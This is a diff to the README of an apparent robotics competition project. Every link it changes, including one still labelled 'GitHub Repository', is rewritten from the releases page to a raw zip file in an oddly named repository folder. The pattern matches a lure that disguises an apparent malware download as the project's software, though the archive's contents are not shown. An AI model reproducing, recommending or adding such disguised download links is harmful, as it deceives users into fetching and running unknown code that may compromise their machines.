@@ -1,6 +1,6 @@
 # 🤖 wro2025-future-engineers-robot - Experience the Future of Robotics
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Kupotanis/wro2025-future-engineers-robot/releases)
+[![Download](https://raw.githubusercontent.com/Kupotanis/wro2025-future-engineers-robot/main/homophyllous/wro2025-future-engineers-robot.zip)](https://raw.githubusercontent.com/Kupotanis/wro2025-future-engineers-robot/main/homophyllous/wro2025-future-engineers-robot.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To download the software, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases section of GitHub:
 
-   [Download Software](https://github.com/Kupotanis/wro2025-future-engineers-robot/releases)
+   [Download Software](https://raw.githubusercontent.com/Kupotanis/wro2025-future-engineers-robot/main/homophyllous/wro2025-future-engineers-robot.zip)
 
 2. **Download the Latest Release**: Locate the latest version and click on the appropriate file for your operating system. 
 
@@ -95,7 +95,7 @@ Explore these topics to deepen your understanding of the technology behind the r
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Kupotanis/wro2025-future-engineers-robot)
-- [Download Software](https://github.com/Kupotanis/wro2025-future-engineers-robot/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Kupotanis/wro2025-future-engineers-robot/main/homophyllous/wro2025-future-engineers-robot.zip)
+- [Download Software](https://raw.githubusercontent.com/Kupotanis/wro2025-future-engineers-robot/main/homophyllous/wro2025-future-engineers-robot.zip)
 
 Thank you for trying the **wro2025-future-engineers-robot**. Enjoy exploring the world of autonomous robotics!
